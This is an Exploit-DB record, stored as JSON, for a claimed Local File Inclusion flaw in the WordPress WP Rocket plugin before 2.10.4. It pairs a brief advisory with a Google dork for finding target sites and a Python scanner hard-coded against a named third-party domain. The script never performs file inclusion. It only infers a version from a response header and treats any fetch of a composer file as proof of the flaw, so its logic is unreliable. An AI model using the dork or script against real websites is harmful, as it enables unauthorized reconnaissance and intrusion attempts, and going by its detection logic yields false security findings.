{"source": "https://www.exploit-db.com/exploits/51830", "vulnName": "WP Rocket < 2.10.3 - Local File Inclusion (LFI)", "vulnEDBID": "51830", "vulnCVE": "N/A", "author": "E1 CODERS", "exploitType": "WEBAPPS", "platform": "PHP", "datePublished": "2024-02-28", "vulnContent": "Paulos Yibelo discovered and reported this Local File Inclusion vulnerability in WordPress WP Rocket Plugin. This could allow a malicious actor to include local files of the target website and show its output onto the screen. Files which store credentials, such as database credentials, could potentially allow complete database takeover depending on the configuration. This vulnerability has been fixed in version 2.10.4.\n\n\nhttps://patchstack.com/database/vulnerability/wp-rocket/wordpress-wp-rocket-plugin-2-10-3-local-file-inclusion-lfi-vulnerability\n\n\nhttps://vulners.com/wpvulndb/WPVDB-ID:5484D821-7017-47A8-90D8-7D87CB5E0E50\n\n\n\n\n\n\nExploit :\n\n#Code By E1.Coders\n\n#Dork : \"Powered by WP Rocket\" filetype:php intitle:\"WP Rocket Configuration\" -\"in\" -\"dirlist\"\n\nDork : http://example.com/wp-content/plugins/wp-rocket/inc/functions/min/v2.10.3/min/min.php\n\n\n \n\nimport requests\nimport time\n\ndef check_wp_rocket_version(url):\n    version_url = url + \"/wp-rocket/css/rocket.css\"\n    try:\n        response = requests.get(version_url)\n        version = response.headers[\"X-Powered-By\"]\n        if \"WP Rocket/\" in version:\n            version = version.split(\"/\")[1]\n            return version\n    except Exception as e:\n        print(f\"Error occurred while fetching WP Rocket version: {e}\")\n    return None\n\ndef test_wp_rocket_lfi_bug(url):\n    lfi_url = url + \"/wp-rocket/inc/vendor/composer/installed.json\"\n    try:\n        response = requests.get(lfi_url)\n        if response.status_code == 200:\n            return True\n    except Exception as e:\n        print(f\"Error occurred while testing LFI: {e}\")\n    return False\n\ndef main():\n    url = \"http://arvatools.com\"\n    wp_rocket_version = check_wp_rocket_version(url)\n    if wp_rocket_version:\n        print(f\"WP Rocket Version: {wp_rocket_version}\")\n        if wp_rocket_version in [\"2.10.0\", \"2.10.1\", \"2.10.2\", \"2.10.3\"]:\n            result = test_wp_rocket_lfi_bug(url)\n            if result:\n                print(\"LFI vulnerability found in WP Rocket\")\n            else:\n                print(\"LFI vulnerability not found in WP Rocket\")\n        else:\n            print(\"WP Rocket version is not affected by the LFI bug\")\n    else:\n        print(\"Unable to fetch WP Rocket version\")\n\nif __name__ == \"__main__\":\n    main()\n            "}